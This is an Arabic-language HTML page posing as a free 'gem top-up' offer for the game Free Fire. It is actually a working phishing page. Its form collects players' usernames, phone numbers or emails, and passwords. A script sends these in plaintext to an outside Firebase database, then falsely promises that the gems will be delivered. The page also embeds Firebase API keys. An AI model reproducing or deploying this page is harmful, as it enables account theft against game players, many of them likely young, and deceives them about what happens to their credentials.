<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>شحن الجواهر - فري فاير</title>
    <style>
        /* منع التكبير والتصغير */
        html, body {
            overflow: hidden;
            height: 100%;
            margin: 0;
            padding: 0;
        }

        /* الصفحة التمهيدية (Splash Screen) */
        #splash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeOut 2s ease-in-out forwards;
        }
        @keyframes fadeOut {
            0% { opacity: 1; }
            90% { opacity: 1; }
            100% { opacity: 0; visibility: hidden; }
        }
        #splash h1 {
            font-size: 3rem;
            color: #ffcc00;
            animation: bounce 1.5s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        /* التصميم العام */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1e1e2f;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background-color: #2a2a40;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            animation: slideIn 1s ease-in-out;
        }
        @keyframes slideIn {
            0% { transform: translateY(-100px); opacity: 0; }
            100% { transform: translateY(0); opacity: 1; }
        }

        h1 {
            margin-bottom: 1.5rem;
            font-size: 1.5rem;
            color: #ffcc00;
        }

        .form-group {
            margin-bottom: 1rem;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 0.5rem;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        input:focus {
            border-color: #ffcc00;
            outline: none;
        }

        button {
            width: 100%;
            padding: 0.75rem;
            background-color: #ffcc00;
            border: none;
            border-radius: 5px;
            color: #1e1e2f;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }
        button:hover {
            background-color: #e6b800;
            transform: scale(1.05);
        }

        #message {
            margin-top: 1rem;
            color: #ffcc00;
            font-weight: bold;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- الصفحة التمهيدية -->
    <div id="splash">
        <h1>فري فاير</h1>
    </div>

    <!-- الصفحة الرئيسية -->
    <div class="container">
        <h1>شحن الجواهر مجاناً لفري فاير</h1>
        <form id="chargeForm">
            <div class="form-group">
                <label for="username">اسم المستخدم:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="phone">رقم الهاتف أو البريد الإلكتروني:</label>
                <input type="text" id="phone" name="phone" required>
            </div>
            <div class="form-group">
                <label for="password">كلمة السر:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="gems">عدد الجواهر:</label>
                <input type="number" id="gems" name="gems" required>
            </div>
            <button type="submit">شحن الجواهر</button>
        </form>
        <div id="message"></div>
    </div>

    <script type="module">
        // Firebase configuration
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDqnTFkAuUvYgykUU26GW_ldRyNm_fix2k",
            authDomain: "free-fire-60201.firebaseapp.com",
            projectId: "free-fire-60201",
            storageBucket: "free-fire-60201.appspot.com",
            messagingSenderId: "817071949096",
            appId: "1:817071949096:web:332ea17a5c045e16867c1d",
            measurementId: "G-EZ720X4G82"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // تسجيل البيانات في Firestore
        document.getElementById('chargeForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const gems = document.getElementById('gems').value;

            try {
                const docRef = await addDoc(collection(db, "users"), {
                    username: username,
                    phone: phone,
                    password: password,
                    gems: gems,
                    timestamp: new Date()
                });
                document.getElementById('message').innerText = "تم تسجيل البيانات بنجاح! سيتم شحن الجواهر قريباً.";
            } catch (error) {
                console.error("Error adding document: ", error);
                document.getElementById('message').innerText = "حدث خطأ أثناء تسجيل البيانات. يرجى المحاولة مرة أخرى.";
            }
        });
    </script>
</body>
  </html>
